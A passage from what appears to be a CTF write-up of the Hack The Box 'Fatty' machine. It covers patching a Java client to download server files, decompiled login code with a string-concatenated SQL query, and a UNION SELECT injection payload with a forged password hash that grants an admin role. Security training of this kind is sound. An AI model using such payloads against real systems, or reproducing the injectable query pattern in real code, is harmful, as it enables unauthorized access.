</span></span></code></pre></td></tr></table></div></div><p>The server seems to be run as <code>qtc</code> so we won&rsquo;t elevate our privilege directly.</p><p>By doing the same with <code>logs</code> and <code>tar</code> we can see what&rsquo;s inside:</p><p><code>/opt/fatty/logs/</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>error-log.txt
</span></span><span class=line><span class=cl>info-log.txt
</span></span></code></pre></td></tr></table></div></div><p><code>/opt/fatty/tar/</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>logs.tar
</span></span></code></pre></td></tr></table></div></div><p>What we could access is <code>/opt/fatty/fatty-server.jar</code> but we can only read text
files, not binaries:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>grep -rn binar htb
</span></span><span class=line><span class=cl>htb/fatty/client/methods/Invoker.java:140:       response = &#34;Unable to convert byte[] to String. Did you read in a binary file?&#34;;
</span></span></code></pre></td></tr></table></div></div><p>So we will have to modify the function to save the file locally on our
filesystem.</p><p>We&rsquo;ll hack into <code>htb/fatty/client/methods/Invoker.java</code>, the <code>public String open</code>
method.
We&rsquo;ll modify that part, from</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/*     */</span><span class=w>     </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/* 138 */</span><span class=w>       </span><span class=n>response</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>response</span><span class=p>.</span><span class=na>getContentAsString</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/* 139 */</span><span class=w>     </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/* 140 */</span><span class=w>       </span><span class=n>response</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;Unable to convert byte[] to String. Did you read in a binary file?&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*     */</span><span class=w>     </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>to</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.File</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.FileOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>response</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;Write to local FS...&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>File</span><span class=w> </span><span class=n>file</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>File</span><span class=p>(</span><span class=n>filename</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>FileOutputStream</span><span class=w> </span><span class=n>outputStream</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FileOutputStream</span><span class=p>(</span><span class=n>file</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>outputStream</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>response</span><span class=p>.</span><span class=na>getContent</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>outputStream</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>response</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=s>&#34;Error&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>or</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.nio.file.Files</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.nio.file.Path</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.nio.file.Paths</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>response</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;Write to local FS...&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>Path</span><span class=w> </span><span class=n>path</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Paths</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>filename</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>Files</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>path</span><span class=p>,</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>response</span><span class=p>.</span><span class=na>getContent</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>response</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=s>&#34;Error&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>or even:</p><p>Let&rsquo;s try to add a method in <code>/htb/fatty/shared/message/ResponseMessage.java</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.FileOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>saveContentToFile</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>filename</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=p>(</span><span class=n>FileOutputStream</span><span class=w> </span><span class=n>stream</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FileOutputStream</span><span class=p>(</span><span class=n>filename</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>stream</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>content</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>e</span><span class=p>.</span><span class=na>printStackTrace</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>and then in <code>htb/fatty/client/methods/Invoker.java</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>response</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;Write to local FS...&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>this</span><span class=p>.</span><span class=na>response</span><span class=p>.</span><span class=na>saveContentToFile</span><span class=p>(</span><span class=n>filename</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>response</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;Error&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>With one of those 3 ways we are able to dump binary files.
Let&rsquo;s dump <code>fatty-server.jar</code>:</p><h2 id=code-analysis-fatty-server>Code analysis: fatty server<a hidden class=anchor aria-hidden=true href=#code-analysis-fatty-server>#</a></h2><p>Now let&rsquo;s decompiler the server JAr with <a href=https://java-decompiler.github.io/>JD-GUI</a> again and export
the code to read it with VSCode.</p><p>It&rsquo;s maybe time to looks for the the SQLi, we already know it&rsquo;s in the
connection code.</p><p>The SQL queries seem to be handle in <code>htb/fatty/server/database/FattyDbSession.java</code>.</p><p>The authentication function looks like that:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=n>User</span><span class=w> </span><span class=nf>checkLogin</span><span class=p>(</span><span class=n>User</span><span class=w> </span><span class=n>user</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>LoginException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>Statement</span><span class=w> </span><span class=n>stmt</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>ResultSet</span><span class=w> </span><span class=n>rs</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>User</span><span class=w> </span><span class=n>newUser</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>stmt</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>conn</span><span class=p>.</span><span class=na>createStatement</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>rs</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>stmt</span><span class=p>.</span><span class=na>executeQuery</span><span class=p>(</span><span class=s>&#34;SELECT id,username,email,password,role FROM users WHERE username=&#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>user</span><span class=p>.</span><span class=na>getUsername</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39;&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>Thread</span><span class=p>.</span><span class=na>sleep</span><span class=p>(</span><span class=n>3000L</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>InterruptedException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=k>return</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>rs</span><span class=p>.</span><span class=na>next</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=kt>int</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>rs</span><span class=p>.</span><span class=na>getInt</span><span class=p>(</span><span class=s>&#34;id&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>String</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>rs</span><span class=p>.</span><span class=na>getString</span><span class=p>(</span><span class=s>&#34;username&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>String</span><span class=w> </span><span class=n>email</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>rs</span><span class=p>.</span><span class=na>getString</span><span class=p>(</span><span class=s>&#34;email&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>String</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>rs</span><span class=p>.</span><span class=na>getString</span><span class=p>(</span><span class=s>&#34;password&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>String</span><span class=w> </span><span class=n>role</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>rs</span><span class=p>.</span><span class=na>getString</span><span class=p>(</span><span class=s>&#34;role&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>newUser</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>User</span><span class=p>(</span><span class=n>id</span><span class=p>,</span><span class=w> </span><span class=n>username</span><span class=p>,</span><span class=w> </span><span class=n>password</span><span class=p>,</span><span class=w> </span><span class=n>email</span><span class=p>,</span><span class=w> </span><span class=n>Role</span><span class=p>.</span><span class=na>getRoleByName</span><span class=p>(</span><span class=n>role</span><span class=p>),</span><span class=w> </span><span class=kc>false</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>newUser</span><span class=p>.</span><span class=na>getPassword</span><span class=p>().</span><span class=na>equalsIgnoreCase</span><span class=p>(</span><span class=n>user</span><span class=p>.</span><span class=na>getPassword</span><span class=p>()))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>newUser</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>LoginException</span><span class=p>(</span><span class=s>&#34;Wrong Password!&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>LoginException</span><span class=p>(</span><span class=s>&#34;Wrong Username!&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>SQLException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>this</span><span class=p>.</span><span class=na>logger</span><span class=p>.</span><span class=na>logError</span><span class=p>(</span><span class=s>&#34;[-] Failure with SQL query: ==&gt; SELECT id,username,email,password,role FROM users WHERE username=&#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>user</span><span class=p>.</span><span class=na>getUsername</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39; &lt;==&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>this</span><span class=p>.</span><span class=na>logger</span><span class=p>.</span><span class=na>logError</span><span class=p>(</span><span class=s>&#34;[-] Exception was: &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>e</span><span class=p>.</span><span class=na>getMessage</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39;&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>We can see the <code>Thread.sleep(3000L);</code> that make time-based attacks difficult
but that doesn&rsquo;t mean we can&rsquo;t make a one-shot SQLi as we still control the
username injected in the query.</p><p>Before we forge a payload, let&rsquo;s take a look at the password format saved in DB.
We can see in <code>htb/fatty/shared/resources/User.java</code> is salted and hashed.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>setPassword</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>password</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>String</span><span class=w> </span><span class=n>hashString</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>username</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;clarabibimakeseverythingsecure&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>MessageDigest</span><span class=w> </span><span class=n>digest</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>digest</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>MessageDigest</span><span class=p>.</span><span class=na>getInstance</span><span class=p>(</span><span class=s>&#34;SHA-256&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>NoSuchAlgorithmException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>e</span><span class=p>.</span><span class=na>printStackTrace</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>hash</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>digest</span><span class=p>.</span><span class=na>digest</span><span class=p>(</span><span class=n>hashString</span><span class=p>.</span><span class=na>getBytes</span><span class=p>(</span><span class=n>StandardCharsets</span><span class=p>.</span><span class=na>UTF_8</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>this</span><span class=p>.</span><span class=na>password</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>DatatypeConverter</span><span class=p>.</span><span class=na>printHexBinary</span><span class=p>(</span><span class=n>hash</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s compute the hash:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ printf %s &#39;qtcclarabibiclarabibimakeseverythingsecure&#39; | sha256sum
</span></span><span class=line><span class=cl>5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046  -
</span></span></code></pre></td></tr></table></div></div><p>We can also note that only password is checked and only username is used for
user retrieval, that means we can inject whatever we want in the ID field or
email address.
But what matters to us is to change our role from <code>user</code> to <code>admin</code>.</p><p>So we end with the following payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cyfun&#39; union select 1337,&#39;qtc&#39;,&#39;qtc@fatty.htb&#39;,&#39;5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046&#39;,&#39;admin
</span></span></code></pre></td></tr></table></div></div><p>Once the payload is injected in the query this will give:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=n>id</span><span class=p>,</span><span class=n>username</span><span class=p>,</span><span class=n>email</span><span class=p>,</span><span class=n>password</span><span class=p>,</span><span class=k>role</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>username</span><span class=o>=</span><span class=s1>&#39;cyfun&#39;</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1337</span><span class=p>,</span><span class=s1>&#39;qtc&#39;</span><span class=p>,</span><span class=s1>&#39;qtc@fatty.htb&#39;</span><span class=p>,</span><span class=s1>&#39;5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046&#39;</span><span class=p>,</span><span class=s1>&#39;admin&#39;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>In <code>htb/fatty/client/gui/ClientGuiTest.java</code> we can see the password is set by
the <code>setPassword</code> function we saw earlier.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>JButton</span><span class=w> </span><span class=n>btnNewButton</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>JButton</span><span class=p>(</span><span class=s>&#34;Login &#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>btnNewButton</span><span class=p>.</span><span class=na>addActionListener</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>ActionListener</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>actionPerformed</span><span class=p>(</span><span class=n>ActionEvent</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ClientGuiTest</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>tfUsername</span><span class=p>.</span><span class=na>getText</span><span class=p>().</span><span class=na>trim</span><span class=p>();</span><span class=w>
